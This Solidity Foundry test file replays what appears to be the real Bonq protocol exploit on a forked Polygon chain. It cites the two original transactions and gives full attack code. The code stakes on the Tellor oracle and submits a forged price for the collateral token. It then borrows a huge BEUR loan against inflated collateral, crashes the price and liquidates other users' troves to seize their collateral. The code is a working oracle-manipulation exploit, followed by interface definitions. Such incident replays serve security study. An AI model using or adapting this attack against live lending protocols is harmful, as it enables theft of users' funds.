// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

// @Tx
// tx1: https://polygonscan.com/tx/0x31957ecc43774d19f54d9968e95c69c882468b46860f921668f2c55fadd51b19
// tx2: https://polygonscan.com/tx/0xa02d0c3d16d6ee0e0b6a42c3cc91997c2b40c87d777136dedebe8ee0f47f32b1

/* ========== Basic Information ========== */
abstract contract Base {
    IERC20 internal constant  TRB = IERC20(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);   
    IERC20 internal constant  WALBT = IERC20(0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632);   
    IERC20 internal constant  BEUR = IERC20(0x338Eb4d394a4327E5dB80d08628fa56EA2FD4B81);   
    ITellorFlex internal constant  TellorFlex = ITellorFlex(0x8f55D884CAD66B79e1a131f6bCB0e66f4fD84d5B);   
    IOriginalTroveFactory internal constant  BonqProxy = IOriginalTroveFactory(0x3bB7fFD08f46620beA3a9Ae7F096cF2b213768B3);   
}

/* ========== Attack Test ========== */
contract ContractTest is Test,Base {
    Exploit exploit;

    function setUp() public {
        vm.label(address(TRB), "TRB");
        vm.label(address(WALBT), "WALBT");
        vm.label(address(BEUR), "BEUR");
        vm.label(address(TellorFlex), "TellorFlex");
        vm.label(address(BonqProxy), "BonqProxy");
    }

    function testStart() public {
        vm.createSelectFork("polygon", 38_792_977);
        exploit = new Exploit();
        deal(address(TRB), address(exploit), 25_152_286_123_277_919_410);
        deal(address(WALBT), address(exploit), 13_359_732_562_723_399_770 * 2);
        exploit.tx1_0xa11ce20c();


        vm.roll(38_793_028);
        vm.warp(1675276266);
        exploit.tx2_0x770344d9();
        emit log_named_decimal_uint("BEUR balance in Exploit contract", BEUR.balanceOf(address(exploit)), 18);
        emit log_named_decimal_uint("WALBT balance in Exploit contract", WALBT.balanceOf(address(exploit)), 18);
    }
}


contract Exploit is Test, Base {
    address maliciousTrove1;
    address maliciousTrove2;

    function tx1_0xa11ce20c() public {
        PriceUpdater priceUpdater = new PriceUpdater();

        TRB.transfer(address(priceUpdater), TellorFlex.getStakeAmount());
        priceUpdater.updatePrice(10_000_000_000_000_000_000, 5_000_000_000_000_000_000_000_000_000);
        maliciousTrove1 = BonqProxy.createTrove(address(WALBT));
        WALBT.transfer(maliciousTrove1, 100_000_000_000_000_000);
        ITrove(maliciousTrove1).increaseCollateral(0, address(0));
        ITrove(maliciousTrove1).borrow(address(this), 100_000_000_000_000_000_000_000_000, address(0));

        maliciousTrove2 = BonqProxy.createTrove(address(WALBT));
        WALBT.transfer(maliciousTrove2, WALBT.balanceOf(address(this)));
        ITrove(maliciousTrove2).increaseCollateral(0, address(0));
    }


    function tx2_0x770344d9() public {
        PriceUpdater priceUpdater = new PriceUpdater();
        TRB.transfer(address(priceUpdater), TellorFlex.getStakeAmount());
        priceUpdater.updatePrice(10_000_000_000_000_000_000, 100_000_000_000);

        address[] memory troves = new address[](45);
        troves[44] = BonqProxy.lastTrove(address(WALBT));
        troves[0] = BonqProxy.firstTrove(address(WALBT));
        require(troves[44] == 0x5343c5d0af82b89DF164A9e829A7102c4edB5402, "not attacker");

        for(uint256 i = 1;i < troves.length; ++i) {
            troves[i] = BonqProxy.nextTrove(address(WALBT), troves[i - 1]);
        }

        for (uint256 i = 1; i < troves.length - 1; ++i) {
            address target = troves[i];
            require(BonqProxy.containsTrove(address(WALBT), target));
            uint256 debt = ITrove(target).debt();
            if (debt == 0) {
                continue;
            }
            ITrove(target).liquidate();
        }

        BEUR.approve(troves[44], type(uint256).max);
        ITrove(troves[44]).repay(type(uint256).max, address(0));
        emit log_named_decimal_uint("WALBT balance in attacker's trove", WALBT.balanceOf(troves[44]), 18);
        ITrove(troves[44]).decreaseCollateral(address(this), WALBT.balanceOf(troves[44]), address(0));
    }

    function updatePrice(uint256 _tokenId, uint256 _price) public {
        TRB.approve(address(TellorFlex), type(uint256).max);
        TellorFlex.depositStake(_tokenId);
        bytes memory data = hex"00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000953706f745072696365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004616c62740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000037573640000000000000000000000000000000000000000000000000000000000"; // not sure what this means
        bytes32 queryId = keccak256(data);
        TellorFlex.submitValue(queryId, abi.encodePacked(_price), 0, data);
    }
}


contract PriceUpdater is Test {
    function updatePrice(uint256 _tokenId, uint256 _price) public {
        (bool suc, ) = msg.sender.delegatecall(abi.encodeWithSignature("updatePrice(uint256,uint256)", _tokenId, _price));
        require(suc, "Update price failed");
    }
}


/* ========== Interface ========== */
interface ITrove {
    event Liquidated(address trove, uint256 debt, uint256 collateral);
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event RoleAdminChanged(
        bytes32 indexed role,
        bytes32 indexed previousAdminRole,
        bytes32 indexed newAdminRole
    );
    event RoleGranted(
        bytes32 indexed role,
        address indexed account,
        address indexed sender
    );
    event RoleRevoked(
        bytes32 indexed role,
        address indexed account,
        address indexed sender
    );

    function BORROWING_RATE() external view returns (uint256);

    function DECIMAL_PRECISION() external view returns (uint256);

    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);

    function LIQUIDATION_RESERVE() external view returns (uint256);

    function MAX_BORROWING_RATE() external view returns (uint256);

    function MAX_INT() external view returns (uint256);

    function OWNER_ROLE() external view returns (bytes32);

    function PERCENT() external view returns (uint256);

    function PERCENT10() external view returns (uint256);

    function PERCENT_05() external view returns (uint256);

    function TOKEN_PRECISION() external view returns (uint256);

    function addOwner(address _newOwner) external;

    function arbitrageParticipation() external view returns (bool);

    function arbitrageState()
        external
        view
        returns (
            address arbitragePool,
            address apToken,
            uint256 lastApPrice
        );

    function borrow(
        address _recipient,
        uint256 _amount,
        address _newNextTrove
    ) external;

    function collateral() external view returns (uint256);

    function collateralValue() external view returns (uint256);

    function collateralization() external view returns (uint256);

    function debt() external view returns (uint256);

    function decreaseCollateral(
        address _recipient,
        uint256 _amount,
        address _newNextTrove
    ) external;

    function factory() external view returns (address);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function getRoleMember(bytes32 role, uint256 index)
        external
        view
        returns (address);

    function getRoleMemberCount(bytes32 role) external view returns (uint256);

    function grantRole(bytes32 role, address account) external;

    function hasRole(bytes32 role, address account)
        external
        view
        returns (bool);

    function increaseCollateral(uint256 _amount, address _newNextTrove)
        external;

    function initialize(address _token, address _troveOwner) external;

    function liqTokenRateSnapshot() external view returns (uint256);

    function liquidate() external;

    function liquidationReserve() external view returns (uint256);

    function mcr() external view returns (uint256);

    function netDebt() external view returns (uint256);

    function owner() external view returns (address);

    function recordedCollateral() external view returns (uint256);

    function redeem(address _recipient, address _newNextTrove)
        external
        returns (uint256 _stableAmount, uint256 _collateralRecieved);

    function removeOwner(address _ownerToRemove) external;

    function renounceOwnership() external;

    function renounceRole(bytes32 role, address account) external;

    function repay(uint256 _amount, address _newNextTrove) external;

    function revokeRole(bytes32 role, address account) external;

    function setArbitrageParticipation(bool _state) external;

    function supportsInterface(bytes4 interfaceId) external view returns (bool);

    function token() external view returns (address);

    function transferOwnership(address _newOwner) external;

    function transferToken(address _token, address _recipient) external;

    function unclaimedArbitrageReward() external view returns (uint256);

    function unclaimedCollateralRewardAndDebt()
        external
        view
        returns (uint256, uint256);
}



interface IOriginalTroveFactory {
    event AdminChanged(address previousAdmin, address newAdmin);
    event BeaconUpgraded(address indexed beacon);
    event CollateralUpdate(address token, uint256 totalCollateral);
    event DebtUpdate(address collateral, uint256 totalDebt);
    event Initialized(uint8 version);
    event NewTrove(address trove, address token, address owner);
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event Paused(address account);
    event Redemption(
        address token,
        uint256 stableAmount,
        uint256 tokenAmount,
        uint256 stableUnspent,
        uint256 startBaseRate,
        uint256 finishBaseRate,
        address lastTroveRedeemed
    );
    event TroveCollateralUpdate(
        address trove,
        address token,
        uint256 newAmount,
        uint256 newCollateralization
    );
    event TroveDebtUpdate(
        address trove,
        address actor,
        address token,
        uint256 newAmount,
        uint256 baseRate,
        uint256 newCollateralization,
        uint256 feePaid
    );
    event TroveImplementationSet(
        address previousImplementation,
        address newImplementation
    );
    event TroveInserted(
        address token,
        address trove,
        address referenceTrove,
        bool before
    );
    event TroveLiquidated(
        address trove,
        address collateralToken,
        uint256 priceAtLiquidation,
        address stabilityPoolLiquidation,
        uint256 collateral
    );
    event TroveRemoved(address trove);
    event Unpaused(address account);
    event Upgraded(address indexed implementation);

    function BORROWING_RATE() external view returns (uint256);

    function DECIMAL_PRECISION() external view returns (uint256);

    function LIQUIDATION_RESERVE() external view returns (uint256);

    function MAX_BORROWING_RATE() external view returns (uint256);

    function MAX_INT() external view returns (uint256);

    function PERCENT() external view returns (uint256);

    function PERCENT10() external view returns (uint256);

    function PERCENT_05() external view returns (uint256);

    function WETHContract() external view returns (address);

    function arbitragePool() external view returns (address);

    function containsTrove(address _token, address _trove)
        external
        view
        returns (bool);

    function createTrove(address _token) external returns (address trove);

    function createTroveAndBorrow(
        address _token,
        uint256 _collateralAmount,
        address _recipient,
        uint256 _borrowAmount,
        address _nextTrove
    ) external;

    function emitLiquidationEvent(
        address _token,
        address _trove,
        address stabilityPoolLiquidation,
        uint256 collateral
    ) external;

    function emitTroveCollateralUpdate(
        address _token,
        uint256 _newAmount,
        uint256 _newCollateralization
    ) external;

    function emitTroveDebtUpdate(
        address _token,
        uint256 _newAmount,
        uint256 _newCollateralization,
        uint256 _feePaid
    ) external;

    function feeRecipient() external view returns (address);

    function firstTrove(address _token) external view returns (address);

    function getBorrowingFee(uint256 _amount) external view returns (uint256);

    function getRedemptionAmount(uint256 _feeRatio, uint256 _amount)
        external
        pure
        returns (uint256);

    function getRedemptionFee(uint256 _feeRatio, uint256 _amount)
        external
        pure
        returns (uint256);

    function getRedemptionFeeRatio(address _trove)
        external
        view
        returns (uint256);

    function increaseCollateralNative(address _trove, address _newNextTrove)
        external
        payable;

    function initialize(address _stableCoin, address _feeRecipient) external;

    function insertTrove(address _token, address _newNextTrove) external;

    function lastTrove(address _token) external view returns (address);

    function liquidateTrove(address _trove, address _token) external;

    function liquidationPool(address _token) external view returns (address);

    function name() external view returns (string memory);

    function nextTrove(address _token, address _trove)
        external
        view
        returns (address);

    function owner() external view returns (address);

    function paused() external view returns (bool);

    function prevTrove(address _token, address _trove)
        external
        view
        returns (address);

    function proxiableUUID() external view returns (bytes32);

    function redeemStableCoinForCollateral(
        address _collateralToken,
        uint256 _stableAmount,
        uint256 _maxRate,
        uint256 _lastTroveCurrentICR,
        address _lastTroveNewPositionHint
    ) external;

    function removeTrove(address _token, address _trove) external;

    function renounceOwnership() external;

    function setArbitragePool(address _arbitragePool) external;

    function setFeeRecipient(address _feeRecipient) external;

    function setLiquidationPool(address _token, address _liquidationPool)
        external;

    function setStabilityPool(address _stabilityPool) external;

    function setTokenOwner() external;

    function setTokenPriceFeed(address _tokenPriceFeed) external;

    function setTroveImplementation(address _troveImplementation) external;

    function setWETH(address _WETH, address _liquidationPool) external;

    function stabilityPool() external view returns (address);

    function stableCoin() external view returns (address);

    function togglePause() external;

    function tokenCollateralization(address _token)
        external
        view
        returns (uint256);

    function tokenOwner() external view returns (address);

    function tokenToPriceFeed() external view returns (address);

    function totalCollateral(address _token) external view returns (uint256);

    function totalDebt() external view returns (uint256);

    function totalDebtForToken(address _token) external view returns (uint256);

    function transferOwnership(address newOwner) external;

    function transferTokenOwnerOwnership(address _newOwner) external;

    function transferTokenOwnership(address _newOwner) external;

    function troveCount(address _token) external view returns (uint256);

    function troveImplementation() external view returns (address);

    function updateTotalCollateral(
        address _token,
        uint256 _amount,
        bool _increase
    ) external;

    function updateTotalDebt(uint256 _amount, bool _borrow) external;

    function upgradeTo(address newImplementation) external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;
}

interface ITellorFlex {
    event NewReport(
        bytes32 indexed _queryId,
        uint256 indexed _time,
        bytes _value,
        uint256 _nonce,
        bytes _queryData,
        address indexed _reporter
    );
    event NewStakeAmount(uint256 _newStakeAmount);
    event NewStaker(address indexed _staker, uint256 indexed _amount);
    event ReporterSlashed(
        address indexed _reporter,
        address _recipient,
        uint256 _slashAmount
    );
    event StakeWithdrawRequested(address _staker, uint256 _amount);
    event StakeWithdrawn(address _staker);
    event ValueRemoved(bytes32 _queryId, uint256 _timestamp);

    function accumulatedRewardPerShare() external view returns (uint256);

    function addStakingRewards(uint256 _amount) external;

    function depositStake(uint256 _amount) external;

    function getBlockNumberByTimestamp(bytes32 _queryId, uint256 _timestamp)
        external
        view
        returns (uint256);

    function getCurrentValue(bytes32 _queryId)
        external
        view
        returns (bytes memory _value);

    function getDataBefore(bytes32 _queryId, uint256 _timestamp)
        external
        view
        returns (
            bool _ifRetrieve,
            bytes memory _value,
            uint256 _timestampRetrieved
        );

    function getGovernanceAddress() external view returns (address);

    function getIndexForDataBefore(bytes32 _queryId, uint256 _timestamp)
        external
        view
        returns (bool _found, uint256 _index);

    function getNewValueCountbyQueryId(bytes32 _queryId)
        external
        view
        returns (uint256);

    function getPendingRewardByStaker(address _stakerAddress)
        external
        returns (uint256 _pendingReward);

    function getRealStakingRewardsBalance() external view returns (uint256);

    function getReportDetails(bytes32 _queryId, uint256 _timestamp)
        external
        view
        returns (address, bool);

    function getReporterByTimestamp(bytes32 _queryId, uint256 _timestamp)
        external
        view
        returns (address);

    function getReporterLastTimestamp(address _reporter)
        external
        view
        returns (uint256);

    function getReportingLock() external view returns (uint256);

    function getReportsSubmittedByAddress(address _reporter)
        external
        view
        returns (uint256);

    function getReportsSubmittedByAddressAndQueryId(
        address _reporter,
        bytes32 _queryId
    ) external view returns (uint256);

    function getStakeAmount() external view returns (uint256);

    function getStakerInfo(address _stakerAddress)
        external
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            bool
        );

    function getTimeOfLastNewValue() external view returns (uint256);

    function getTimestampIndexByTimestamp(bytes32 _queryId, uint256 _timestamp)
        external
        view
        returns (uint256);

    function getTimestampbyQueryIdandIndex(bytes32 _queryId, uint256 _index)
        external
        view
        returns (uint256);

    function getTokenAddress() external view returns (address);

    function getTotalStakeAmount() external view returns (uint256);

    function getTotalStakers() external view returns (uint256);

    function getTotalTimeBasedRewardsBalance() external view returns (uint256);

    function governance() external view returns (address);

    function init(address _governanceAddress) external;

    function isInDispute(bytes32 _queryId, uint256 _timestamp)
        external
        view
        returns (bool);

    function minimumStakeAmount() external view returns (uint256);

    function owner() external view returns (address);

    function removeValue(bytes32 _queryId, uint256 _timestamp) external;

    function reportingLock() external view returns (uint256);

    function requestStakingWithdraw(uint256 _amount) external;

    function retrieveData(bytes32 _queryId, uint256 _timestamp)
        external
        view
        returns (bytes memory);

    function rewardRate() external view returns (uint256);

    function slashReporter(address _reporter, address _recipient)
        external
        returns (uint256 _slashAmount);

    function stakeAmount() external view returns (uint256);

    function stakeAmountDollarTarget() external view returns (uint256);

    function stakingRewardsBalance() external view returns (uint256);

    function stakingTokenPriceQueryId() external view returns (bytes32);

    function submitValue(
        bytes32 _queryId,
        bytes memory _value,
        uint256 _nonce,
        bytes memory _queryData
    ) external;

    function timeBasedReward() external view returns (uint256);

    function timeOfLastAllocation() external view returns (uint256);

    function timeOfLastNewValue() external view returns (uint256);

    function toWithdraw() external view returns (uint256);

    function token() external view returns (address);

    function totalRewardDebt() external view returns (uint256);

    function totalStakeAmount() external view returns (uint256);

    function totalStakers() external view returns (uint256);

    function updateStakeAmount() external;

    function verify() external pure returns (uint256);

    function withdrawStake() external;
}